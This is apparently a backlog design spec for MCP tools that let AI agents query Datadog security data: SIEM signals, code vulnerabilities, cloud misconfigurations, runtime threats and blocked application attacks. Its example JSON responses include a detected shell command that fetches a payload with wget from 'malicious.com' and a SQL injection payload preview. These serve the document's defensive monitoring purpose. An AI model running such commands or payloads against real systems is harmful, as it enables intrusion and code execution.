---
title: "Datadog Security Tools"
status: backlog
priority: low
date_created: 2026-02-05
datadog_urls:
  overview: https://app.datadoghq.com/security/overview
  siem: https://app.datadoghq.com/security/siem/
  code_security: https://app.datadoghq.com/security/code-security/
  csm: https://app.datadoghq.com/security/csm
  workload: https://app.datadoghq.com/security/workload-protection/
  appsec: https://app.datadoghq.com/security/appsec/overview
completion:
  - [ ] list_security_signals tool (Cloud SIEM)
  - [ ] get_code_vulnerabilities tool
  - [ ] list_cloud_misconfigurations tool (CSM)
  - [ ] list_runtime_threats tool (Workload Protection)
  - [ ] list_appsec_attacks tool (App & API Protection)
related_files:
  - src/server.py
  - src/datadog_integration.py
---

# Datadog Security Tools

## Overview

Add MCP tools to query Datadog Security features for threat detection, vulnerability management, and compliance monitoring. This enables AI agents to investigate security incidents, identify vulnerabilities, and assess cloud security posture.

---

## Tools

### 1. `list_security_signals` (Cloud SIEM)

List security signals from Cloud SIEM detection rules.

**Parameters**:
| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `severity` | enum | No | critical, high, medium, low, info |
| `service` | string | No | Filter by service |
| `env` | enum | No | cistable, qa, production |
| `rule_type` | string | No | Detection rule type |
| `status` | enum | No | open, archived |
| `hours_back` | int | No | Time range (default: 24) |
| `limit` | int | No | Max results (default: 50) |

**Use Cases**:
- "Show critical security signals for auth service"
- "Any high-severity alerts in production today?"
- "List all open security signals"

**Response Format**:
```json
{
  "signals": [
    {
      "id": "signal_abc123",
      "title": "Suspicious login activity detected",
      "severity": "high",
      "status": "open",
      "rule_name": "Brute force login attempt",
      "service": "pason-auth-service",
      "env": "production",
      "timestamp": "2026-02-05T10:30:00Z",
      "attributes": {
        "source_ip": "192.168.1.100",
        "failed_attempts": 50,
        "user": "admin"
      }
    }
  ],
  "count": 1,
  "summary": {
    "critical": 0,
    "high": 1,
    "medium": 5,
    "low": 12
  }
}
```

### 2. `get_code_vulnerabilities`

Get code security vulnerabilities from SCA (Software Composition Analysis) and SAST.

**Parameters**:
| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `service` | string | No | Service name |
| `severity` | enum | No | critical, high, medium, low |
| `language` | string | No | java, python, javascript, go, etc. |
| `cve_id` | string | No | Specific CVE filter |
| `status` | enum | No | open, fixed, ignored |
| `vuln_type` | enum | No | dependency, code |
| `limit` | int | No | Max results (default: 100) |

**Use Cases**:
- "What vulnerabilities are in pason-auth-service?"
- "Show critical CVEs in Java services"
- "List all Log4j vulnerabilities"

**Response Format**:
```json
{
  "vulnerabilities": [
    {
      "id": "vuln_abc123",
      "cve_id": "CVE-2021-44228",
      "title": "Log4j Remote Code Execution",
      "severity": "critical",
      "cvss_score": 10.0,
      "service": "pason-realtime-service",
      "language": "java",
      "package": "org.apache.logging.log4j:log4j-core",
      "current_version": "2.14.0",
      "fixed_version": "2.17.1",
      "status": "open",
      "first_detected": "2026-01-15T00:00:00Z"
    }
  ],
  "count": 1,
  "summary": {
    "critical": 1,
    "high": 5,
    "medium": 20,
    "low": 45
  }
}
```

### 3. `list_cloud_misconfigurations` (CSM)

List Cloud Security Posture Management findings for cloud resources.

**Parameters**:
| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `resource_type` | string | No | s3, ec2, iam, rds, lambda, etc. |
| `compliance_rule` | string | No | CIS, SOC2, PCI, HIPAA, etc. |
| `severity` | enum | No | critical, high, medium, low |
| `account` | string | No | AWS account ID filter |
| `status` | enum | No | pass, fail |
| `limit` | int | No | Max results (default: 100) |

**Use Cases**:
- "Show S3 bucket misconfigurations in production"
- "What CIS violations do we have?"
- "List all IAM policy issues"

**Response Format**:
```json
{
  "findings": [
    {
      "id": "finding_abc123",
      "rule_name": "S3 bucket has public access",
      "severity": "critical",
      "compliance_frameworks": ["CIS", "SOC2"],
      "resource_type": "aws_s3_bucket",
      "resource_id": "arn:aws:s3:::my-bucket",
      "account": "879270876743",
      "region": "us-east-1",
      "status": "fail",
      "remediation": "Disable public access in bucket policy",
      "first_detected": "2026-02-01T00:00:00Z"
    }
  ],
  "count": 1,
  "summary": {
    "pass": 450,
    "fail": 25,
    "by_severity": {
      "critical": 2,
      "high": 8,
      "medium": 10,
      "low": 5
    }
  }
}
```

### 4. `list_runtime_threats` (Workload Protection)

List runtime security threats from Cloud Workload Security (CWS).

**Parameters**:
| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `host` | string | No | Host filter |
| `container` | string | No | Container name filter |
| `severity` | enum | No | critical, high, medium, low |
| `threat_type` | enum | No | process, file, network |
| `env` | enum | No | cistable, qa, production |
| `hours_back` | int | No | Time range (default: 24) |
| `limit` | int | No | Max results (default: 50) |

**Use Cases**:
- "Any runtime threats detected on production containers?"
- "Show suspicious process activity on syslog servers"
- "List file integrity violations"

**Response Format**:
```json
{
  "threats": [
    {
      "id": "threat_abc123",
      "title": "Suspicious process execution",
      "severity": "high",
      "threat_type": "process",
      "host": "datahub-fargate-01",
      "container": "hub-ca-pason-realtime-service",
      "env": "production",
      "timestamp": "2026-02-05T14:00:00Z",
      "details": {
        "process": "/bin/sh -c wget http://malicious.com/payload",
        "user": "root",
        "parent_process": "java"
      },
      "rule_name": "Shell spawned by Java process"
    }
  ],
  "count": 1
}
```

### 5. `list_appsec_attacks` (App & API Protection)

List application security attacks detected by ASM (Application Security Management).

**Parameters**:
| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `service` | string | No | Service name |
| `attack_type` | enum | No | sqli, xss, lfi, ssrf, command_injection, etc. |
| `severity` | enum | No | critical, high, medium, low |
| `env` | enum | No | cistable, qa, production |
| `blocked` | bool | No | Filter by blocked status |
| `hours_back` | int | No | Time range (default: 24) |
| `limit` | int | No | Max results (default: 100) |

**Use Cases**:
- "Show SQL injection attempts against hub-ca-api"
- "What attacks were blocked today?"
- "List all XSS attempts in production"

**Response Format**:
```json
{
  "attacks": [
    {
      "id": "attack_abc123",
      "attack_type": "sqli",
      "severity": "critical",
      "service": "hub-ca-api",
      "env": "production",
      "endpoint": "/api/v1/users",
      "method": "POST",
      "source_ip": "192.168.1.100",
      "timestamp": "2026-02-05T15:30:00Z",
      "blocked": true,
      "payload_preview": "' OR '1'='1",
      "waf_rule": "OWASP CRS 942100"
    }
  ],
  "count": 1,
  "summary": {
    "total_attacks": 150,
    "blocked": 145,
    "not_blocked": 5,
    "by_type": {
      "sqli": 80,
      "xss": 40,
      "lfi": 20,
      "ssrf": 10
    }
  }
}
```

---

## Implementation Notes

### API Reference

- Security Monitoring API: https://docs.datadoghq.com/api/latest/security-monitoring/
- Cloud Security Posture API: Not yet publicly documented - may need custom implementation
- ASM API: https://docs.datadoghq.com/api/latest/application-security/

### Required Permissions

- `security_monitoring_signals_read` - Read SIEM signals
- `security_monitoring_rules_read` - Read detection rules
- `appsec_read` - Read ASM data

### Security Considerations

- Filter sensitive data from attack payloads
- Mask IP addresses in responses if needed
- Consider rate limiting for security queries
- Log all security data access for audit

### Example Workflow

1. User reports: "We may have been attacked last night"
2. Agent uses `list_security_signals(severity="critical", hours_back=24)`
3. Finds suspicious activity, uses `list_appsec_attacks(service="hub-ca-api")`
4. Correlates with `list_runtime_threats` for container-level threats
5. Uses `get_code_vulnerabilities` to check if exploited vulnerability exists
